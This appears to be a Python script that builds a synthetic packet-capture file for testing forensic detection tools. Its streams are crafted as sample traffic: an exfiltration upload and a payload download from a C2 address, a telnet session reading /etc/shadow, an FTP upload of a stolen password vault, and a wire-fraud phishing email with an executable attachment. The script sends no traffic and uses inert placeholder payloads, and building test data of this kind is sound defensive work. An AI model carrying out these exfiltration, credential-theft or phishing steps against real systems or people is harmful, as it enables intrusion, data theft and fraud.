import struct
import time
import socket

def build_pcap():
    out_pcap = "test-files/ultimate_detection.pcap"
    
    # Standard PCAP Header: Little endian, v2.4, snaplen 65535, Ethernet (1)
    pcap_hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    
    packets = []
    base_ts = 1760000000.0  # epoch timestamp

    def ip_to_bytes(ip_str):
        return socket.inet_aton(ip_str)

    def checksum(data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack(f"!{len(data)//2}H", data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def make_eth_ip_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, payload):
        eth_hdr = dst_mac + src_mac + b'\x08\x00'  # IPv4
        
        # IP Header (20 bytes)
        total_len = 20 + 20 + len(payload)
        ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, 1234, 0x4000, 64, 6, 0,  # proto 6 = TCP
            ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
        )
        ip_cksum = checksum(ip_hdr_no_cksum)
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, 1234, 0x4000, 64, 6, ip_cksum,
            ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
        )
        
        # TCP Header (20 bytes)
        tcp_hdr_no_cksum = struct.pack("!HHIIBBHHH",
            src_port, dst_port, seq, ack, (5 << 4), flags, 8192, 0, 0
        )
        # Pseudo header for TCP checksum
        pseudo_hdr = struct.pack("!4s4sBBH",
            ip_to_bytes(src_ip), ip_to_bytes(dst_ip), 0, 6, 20 + len(payload)
        )
        tcp_cksum = checksum(pseudo_hdr + tcp_hdr_no_cksum + payload)
        tcp_hdr = struct.pack("!HHIIBBHHH",
            src_port, dst_port, seq, ack, (5 << 4), flags, 8192, tcp_cksum, 0
        )
        
        return eth_hdr + ip_hdr + tcp_hdr + payload

    mac_client = b'\x00\x11\x22\x33\x44\x55'
    mac_server = b'\x00\xaa\xbb\xcc\xdd\xee'

    # Stream 1: HTTP GET Google Search
    s1_payload = b"GET /search?q=how+to+bypass+amsi+powershell HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    p1 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "142.250.190.46", 51200, 80, 1000, 0, 0x18, s1_payload)
    packets.append((base_ts + 1, p1))

    # Stream 2: HTTP GET DuckDuckGo Search
    s2_payload = b"GET /?q=mimikatz+active+directory+dump HTTP/1.1\r\nHost: duckduckgo.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    p2 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "52.142.124.215", 51201, 80, 2000, 0, 0x18, s2_payload)
    packets.append((base_ts + 3, p2))

    # Stream 3: HTTP POST Form Submission with Credentials
    s3_post = (
        b"POST /login.php HTTP/1.1\r\n"
        b"Host: portal.target.local\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 64\r\n\r\n"
        b"username=administrator&password=P@ssw0rd2026!&token=xyz987456123&action=auth"
    )
    p3 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "10.0.0.5", 51202, 80, 3000, 0, 0x18, s3_post)
    packets.append((base_ts + 6, p3))

    # Stream 4: Exfiltration Upload to C2 (185.190.140.50 matching EVTX Sysmon Event 3!)
    s4_exfil = (
        b"POST /upload_staged_data HTTP/1.1\r\n"
        b"Host: 185.190.140.50\r\n"
        b"Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\r\n"
        b"Content-Length: 512\r\n\r\n"
        b"-----------------------------974767299852498929531610575\r\n"
        b"Content-Disposition: form-data; name=\"upload\"; filename=\"confidential_q3_financials.zip\"\r\n"
        b"Content-Type: application/zip\r\n\r\n"
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00FileSanitizer Exfiltrated Test Archive Data"
    )
    p4 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "185.190.140.50", 51234, 443, 4000, 0, 0x18, s4_exfil)
    packets.append((base_ts + 10, p4))

    # Stream 5: C2 Payload Download
    s5_req = b"GET /McMpEng.exe HTTP/1.1\r\nHost: 185.190.140.50\r\n\r\n"
    p5_req = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "185.190.140.50", 51235, 80, 5000, 0, 0x18, s5_req)
    packets.append((base_ts + 12, p5_req))

    s5_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: Apache/2.4.41\r\n"
        b"Content-Type: application/x-msdownload\r\n"
        b"Content-Disposition: attachment; filename=\"McMpEng.exe\"\r\n"
        b"Content-Length: 256\r\n\r\n"
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00This program cannot be run in DOS mode."
    )
    p5_resp = make_eth_ip_tcp(mac_server, mac_client, "185.190.140.50", "10.0.0.15", 80, 51235, 100, 5000, 0x18, s5_resp)
    packets.append((base_ts + 13, p5_resp))

    # Stream 6: Terminal Session (Telnet Port 23)
    p6_c1 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "185.190.140.50", 51250, 23, 6000, 0, 0x18, b"whoami\r\n")
    p6_s1 = make_eth_ip_tcp(mac_server, mac_client, "185.190.140.50", "10.0.0.15", 23, 51250, 200, 6008, 0x18, b"root\r\n# ")
    p6_c2 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "185.190.140.50", 51250, 23, 6008, 208, 0x18, b"cat /etc/shadow\r\n")
    p6_s2 = make_eth_ip_tcp(mac_server, mac_client, "185.190.140.50", "10.0.0.15", 23, 51250, 208, 6025, 0x18, b"root:$6$xyz789:19000:0:99999:7:::\r\ndaemon:*:18885:0:99999:7:::\r\n# ")
    packets.append((base_ts + 15, p6_c1))
    packets.append((base_ts + 16, p6_s1))
    packets.append((base_ts + 17, p6_c2))
    packets.append((base_ts + 18, p6_s2))

    # Stream 7: FTP Command Session (Port 21)
    p7_c1 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "10.0.0.8", 51260, 21, 7000, 0, 0x18, b"USER anonymous\r\n")
    p7_s1 = make_eth_ip_tcp(mac_server, mac_client, "10.0.0.8", "10.0.0.15", 21, 51260, 300, 7016, 0x18, b"331 Guest login ok, send your email as password.\r\n")
    p7_c2 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "10.0.0.8", 51260, 21, 7016, 350, 0x18, b"PASS guest@target.local\r\n")
    p7_s2 = make_eth_ip_tcp(mac_server, mac_client, "10.0.0.8", "10.0.0.15", 21, 51260, 350, 7041, 0x18, b"230 User logged in.\r\n")
    p7_c3 = make_eth_ip_tcp(mac_client, mac_server, "10.0.0.15", "10.0.0.8", 51260, 21, 7041, 372, 0x18, b"STOR stolen_passwords.kdbx\r\n")
    p7_s3 = make_eth_ip_tcp(mac_server, mac_client, "10.0.0.8", "10.0.0.15", 21, 51260, 372, 7068, 0x18, b"150 Opening BINARY mode data connection for stolen_passwords.kdbx\r\n")
    packets.append((base_ts + 20, p7_c1))
    packets.append((base_ts + 21, p7_s1))
    packets.append((base_ts + 22, p7_c2))
    packets.append((base_ts + 23, p7_s2))
    packets.append((base_ts + 24, p7_c3))
    packets.append((base_ts + 25, p7_s3))

    # Stream 8: SMTP Email Message (Port 25)
    smtp_body = (
        b"HELO mail.attacker.org\r\n"
        b"MAIL FROM:<phish@attacker.org>\r\n"
        b"RCPT TO:<alice@target.local>\r\n"
        b"DATA\r\n"
        b"From: Executive Office <ceo@corporate-security.com>\r\n"
        b"To: alice@target.local\r\n"
        b"Subject: URGENT: Wire Transfer Authorization Required\r\n"
        b"Date: Sun, 04 Oct 2026 12:00:00 +0000\r\n"
        b"Content-Type: multipart/mixed; boundary=\"_BOUNDARY_123_\"\r\n\r\n"
        b"--_BOUNDARY_123_\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n\r\n"
        b"Dear Alice,\r\nPlease approve the attached invoice for immediate payment.\r\n\r\n"
        b"--_BOUNDARY_123_\r\n"
        b"Content-Disposition: attachment; filename=\"Wire_Invoice.exe\"\r\n"
        b"Content-Type: application/x-msdownload\r\n\r\n"
        b"MZ_EXECUTABLE_PAYLOAD_HERE\r\n"
        b"--_BOUNDARY_123_--\r\n"
        b".\r\n"
        b"QUIT\r\n"
    )
    p8 = make_eth_ip_tcp(mac_client, mac_server, "198.51.100.44", "10.0.0.25", 51270, 25, 8000, 0, 0x18, smtp_body)
    packets.append((base_ts + 28, p8))

    with open(out_pcap, "wb") as f:
        f.write(pcap_hdr)
        for ts, pkt in packets:
            ts_sec = int(ts)
            ts_usec = int((ts - ts_sec) * 1e6)
            pkt_hdr = struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt))
            f.write(pkt_hdr + pkt)

    print(f"Generated comprehensive forensic PCAP {out_pcap} with {len(packets)} packets successfully.")

if __name__ == "__main__":
    build_pcap()
